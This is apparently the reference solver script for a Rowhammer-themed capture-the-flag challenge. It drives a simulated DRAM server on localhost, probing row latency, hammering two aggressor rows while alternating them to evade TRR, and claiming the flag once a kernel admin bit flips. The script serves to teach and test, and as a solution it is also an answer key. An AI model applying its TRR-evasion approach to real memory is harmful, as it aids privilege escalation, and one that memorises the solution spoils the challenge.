#!/usr/bin/env python3
"""
solve2.py  —  Reference solver for the DRAMSim3-backed CTF server
==================================================================

Intended solve path:
  1. INFO     — detect mode
  2. PROBE    — use timing side-channel to identify physical rows
               adjacent to the kernel (high latency = adjacent)
  3. ASCII    — read embedded hints from all user pages
  4. STAGE1   — claim after touching ≥2 rows
  5. PAGEMAP  — confirm VA→PA mapping (now unlocked)
  6. STAGE2   — claim after touching both aggressor rows
  7. HAMMER   — double-sided hammer both aggressor rows repeatedly
               (Hammulator linear model: probability grows with HC)
  8. GETFLAG  — claim Stage 3 when admin bit flips

Defenses to work around:
  - TRR: if same row is hammered > TRR_THRESHOLD times,
         it gets defended → alternate between left and right aggressor
  - PARA: small random HC resets on neighbors — just keep going
  - tREFI: DRAM refreshes reset HC every ~9363 cycles
           → hammer quickly, don't REFRESH yourself
"""

import socket
import re
import time

HOST = "127.0.0.1"
PORT = 5000

PAGE_SIZE=32
NUM_USER_PAGES = 6
MAX_HAMMER_ROUNDS = 500


# ─────────────────────────────────────────────
# Socket helpers
# ─────────────────────────────────────────────
def recv_until_prompt(sock: socket.socket) -> str:
    data = b""
    while not data.endswith(b"> "):
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data.decode(errors="ignore")


def send_cmd(sock: socket.socket, cmd: str) -> str:
    sock.sendall((cmd + "\n").encode())
    return recv_until_prompt(sock)


# ─────────────────────────────────────────────
# Parsing helpers
# ─────────────────────────────────────────────
def parse_mode(info: str) -> str:
    m = re.search(r"mode=(\w+)", info)
    return m.group(1).lower() if m else "hybrid"


def parse_latency(probe_resp: str) -> int:
    m = re.search(r"access_latency=(\d+)", probe_resp)
    return int(m.group(1)) if m else 12


def parse_row(probe_resp: str) -> int:
    m = re.search(r"physical_row=(\d+)", probe_resp)
    return int(m.group(1)) if m else -1


# ─────────────────────────────────────────────
# Phase 1: Probe all user pages to find high-latency rows
#          (those adjacent to the kernel)
# ─────────────────────────────────────────────
def phase1_probe(sock: socket.socket) -> tuple[list[int], dict[int, int]]:
    """
    Returns:
      sorted_vaddrs  : virtual addresses sorted by latency (highest first)
      row_map        : vaddr -> physical_row
    """
    print("[*] Phase 1: PROBE timing side-channel scan")
    latencies = {}   # vaddr -> latency
    row_map   = {}   # vaddr -> phys_row
    page_starts = [i * PAGE_SIZE for i in range(NUM_USER_PAGES)]

    for vaddr in page_starts:
        resp = send_cmd(sock, f"PROBE {vaddr}")
        print(f"    PROBE {vaddr}: {resp.strip()}")
        latencies[vaddr] = parse_latency(resp)
        row_map[vaddr]   = parse_row(resp)

    # Sort by latency descending — highest = most adjacent to kernel
    sorted_vaddrs = sorted(latencies, key=lambda v: latencies[v], reverse=True)
    print(f"[*] Latency ranking: {[(v, latencies[v]) for v in sorted_vaddrs]}")
    print(f"[*] Top 2 candidates (likely aggressor rows): "
          f"{sorted_vaddrs[:2]}")
    return sorted_vaddrs, row_map


# ─────────────────────────────────────────────
# Phase 2: Read all hints from ASCII memory
# ─────────────────────────────────────────────
def phase2_read_hints(sock: socket.socket):
    print("[*] Phase 2: Reading embedded hints from memory")
    page_starts = [i * PAGE_SIZE for i in range(NUM_USER_PAGES)]
    for vaddr in page_starts:
        resp = send_cmd(sock, f"ASCII {vaddr} {PAGE_SIZE}")
        print(f"page vaddr={vaddr}: {resp.strip()}")


# ─────────────────────────────────────────────
# Phase 3: Double-sided HAMMER attack
#          Alternates between left and right aggressor rows
#          to avoid TRR while maximising disturbance on kernel
# ─────────────────────────────────────────────
def phase3_hammer(sock: socket.socket,
                  left_vaddr: int,
                  right_vaddr: int) -> bool:
    """
    Double-sided hammering.
    Returns True when kernel bit flip is detected.
    """
    print(f"[*] Phase 3: Double-sided HAMMER "
          f"left={left_vaddr} right={right_vaddr}")
    print(f"    Strategy: alternate L/R to avoid TRR, "
          f"watch for HC growth and bit flip")

    for i in range(MAX_HAMMER_ROUNDS):
        # Alternate left/right — this is the TRR bypass technique
        # (TRR tracks individual rows; alternating confuses it)
        resp_l = send_cmd(sock, f"HAMMER {left_vaddr}")
        if "FLIPPED" in resp_l or "kernel bit FLIPPED" in resp_l:
            print(f"[+] BIT FLIP on left hammer! Round {i}")
            print(resp_l.strip())
            return True

        resp_r = send_cmd(sock, f"HAMMER {right_vaddr}")
        if "FLIPPED" in resp_r or "kernel bit FLIPPED" in resp_r:
            print(f"[+] BIT FLIP on right hammer! Round {i}")
            print(f"R: {resp_r.strip()}")
            return True

        # Log progress every 20 rounds
        if i % 20 == 0:
            # Parse HC from response
            hc_match = re.search(r"HC=([\d.]+)", resp_l)
            hc = float(hc_match.group(1)) if hc_match else 0.0
            print(f"    Round {i}: HC={hc:.1f} "
                  f"(need {5} for first flip chance)")
        row_l = re.search(r"row=(\d+)", resp_l)
        row_r = re.search(r"row=(\d+)", resp_r)
        if row_l and row_r:
            print(f"    rows: left_row={row_l.group(1)} "
                 f"right_row={row_r.group(1)}")
            
        # If TRR defended — pause and let refresh clear it
        if "TRR defended" in resp_l or "TRR defended" in resp_r:
            print(f"    [!] TRR triggered at round {i} — "
                  f"waiting for tREFI refresh...")
            time.sleep(0.1)   # in real attack: wait for hardware refresh
            # Don't call REFRESH ourselves — that also resets our own HC

    print("[-] Max rounds reached without flip.")
    return False


# ─────────────────────────────────────────────
# Main solver
# ─────────────────────────────────────────────
def main():
    print("=" * 55)
    print(" Flip-to-Win CTF — Reference Solver (DRAMSim3 edition)")
    print("=" * 55)

    with socket.create_connection((HOST, PORT)) as sock:
        # Banner
        banner = recv_until_prompt(sock)
        print(banner, end="")

        # ── INFO ─────────────────────────────────
        info = send_cmd(sock, "INFO")
        print(info, end="")
        mode = parse_mode(info)
        print(f"[*] Detected mode: {mode}")

        # ── Phase 2: Read hints ───────────────────
        phase2_read_hints(sock)

        # ── Phase 1: Probe for adjacency ──────────
        sorted_vaddrs, row_map = phase1_probe(sock)

        # Touch the top 2 high-latency pages to unlock stages
        for vaddr in sorted_vaddrs[:2]:
            resp = send_cmd(sock, f"HAMMER {vaddr}")
            print(f"    Initial HAMMER {vaddr}: {resp.strip()[:80]}")

        # ── Stage 1 ───────────────────────────────
        s1 = send_cmd(sock, "STAGE1")
        print(f"[*] STAGE1: {s1.strip()}")

        # ── PAGEMAP (now unlocked) ─────────────────
        pm = send_cmd(sock, "PAGEMAP")
        print("[*] PAGEMAP response:")
        print(pm, end="")

        # ── Stage 2 ───────────────────────────────
        s2 = send_cmd(sock, "STAGE2")
        print(f"[*] STAGE2: {s2.strip()}")

        # ── Phase 3: Double-sided hammer attack ───
        if mode == "press":
            print("[!] Mode is 'press' — HAMMER won't work.")
            print("    (This CTF mode is not yet implemented in solver)")
            send_cmd(sock, "EXIT")
            return

        left_vaddr  = sorted_vaddrs[0]
        right_vaddr = sorted_vaddrs[1]

        flipped = phase3_hammer(sock, left_vaddr, right_vaddr)

        # ── GETFLAG ───────────────────────────────
        if flipped:
            flag_resp = send_cmd(sock, "GETFLAG")
            print(f"\n{'='*50}")
            print(f"[+] FLAG: {flag_resp.strip()}")
            print(f"{'='*50}")
        else:
            print("[-] Flip not achieved in this run. Try again.")
            # Print stats for debugging
            stats = send_cmd(sock, "STATS")
            print(stats, end="")

        send_cmd(sock, "EXIT")


if __name__ == "__main__":
    main()
